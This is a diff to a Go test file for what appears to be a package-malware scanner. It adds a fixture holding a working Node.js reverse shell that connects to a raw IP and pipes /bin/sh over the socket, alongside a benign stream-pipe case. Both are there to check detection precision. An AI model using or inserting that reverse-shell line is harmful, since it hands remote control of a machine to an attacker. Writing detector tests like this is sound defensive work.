@@ -186,11 +186,23 @@ func TestReverseShellSource(t *testing.T) {
 	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.PyPI}, p))["reverse-shell-source"] != verdict.SevCritical {
 		t.Fatal("Tier B python dup2->shell not flagged critical")
 	}
+	// Tier B: node socket PIPED to a shell's stdio (the elf-stats-* raw-IP shell that
+	// dup2-only matching missed). connect + .pipe() + /bin/sh spawn.
+	pipe := unpacked(map[string]string{"index.js": "const net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);const c=new net.Socket();c.connect(9000,'161.97.148.123',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});"})
+	if hasRuleSet(Analyze(art, pipe))["reverse-shell-source"] != verdict.SevCritical {
+		t.Fatalf("Tier B node socket->shell via .pipe() not flagged critical: %+v", Analyze(art, pipe))
+	}
 	// Precision: a benign net client that opens a socket and spawns a helper but
 	// does NOT bind the socket to a shell must not fire.
 	ok := unpacked(map[string]string{"index.js": "const s=require('net').connect(80,'api.example');require('child_process').spawn('node',['worker.js']);"})
 	if hasRule(Analyze(art, ok), "reverse-shell-source") != nil {
 		t.Fatal("benign socket + non-shell spawn wrongly flagged")
+	}
+	// Precision: a benign stream pipeline (gzip a file over a socket) — has .pipe()
+	// and a socket but NO shell target — must not fire.
+	stream := unpacked(map[string]string{"gz.js": "const net=require('net'),zlib=require('zlib'),fs=require('fs');const s=net.connect(443,'cdn.example');fs.createReadStream('a').pipe(zlib.createGzip()).pipe(s);"})
+	if hasRule(Analyze(art, stream), "reverse-shell-source") != nil {
+		t.Fatal("benign stream pipe over socket (no shell) wrongly flagged")
 	}
 }
 
